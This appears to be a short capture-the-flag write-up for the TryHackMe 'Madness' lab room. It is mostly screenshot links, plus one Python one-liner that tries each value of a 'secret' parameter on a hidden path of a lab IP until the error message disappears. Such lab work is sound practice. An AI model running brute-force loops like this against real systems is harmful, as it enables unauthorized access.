## Link:https://tryhackme.com/room/madness
---
The image has:
<img width="1600" height="900" alt="Screenshot_2026-07-14_22_02_26" src="https://github.com/user-attachments/assets/3a14dedc-3fb5-458d-8a58-dafedf98beb3" />
---

<img width="1600" height="900" alt="Screenshot_2026-07-14_21_58_12" src="https://github.com/user-attachments/assets/48cf6627-d10f-426b-a565-ce6ab8d30568" />
---
<img width="1600" height="900" alt="Screenshot_2026-07-14_22_14_07" src="https://github.com/user-attachments/assets/35f0548d-cb98-4457-b76d-b18fff6ef559" />
---
<img width="1600" height="900" alt="Screenshot_2026-07-14_22_18_05" src="https://github.com/user-attachments/assets/7394dca6-177a-4458-ba4a-2fc162715641" />
---
<img width="1600" height="900" alt="Screenshot_2026-07-14_22_34_04" src="https://github.com/user-attachments/assets/f19904f4-af33-4ed7-9b37-1228a212e651" />
---
## The Recoverd image
---
<img width="400" height="400" alt="thm" src="https://github.com/user-attachments/assets/3f8b751b-a244-44df-9d93-956468da7986" />


python3 -c '
import requests
for i in range(100):
    url = f"http://10.48.170.21/th1s_1s_h1dd3n/?secret={i}"
    r = requests.get(url)
    if "That is wrong" not in r.text:
        print(f"[+] FOUND SECRET: {i}")
        print(r.text)
        break
'

<img width="1600" height="900" alt="Screenshot_2026-07-14_23_02_09" src="https://github.com/user-attachments/assets/a0a7b52c-3b26-48d0-b5ce-292fbc6d680c" />
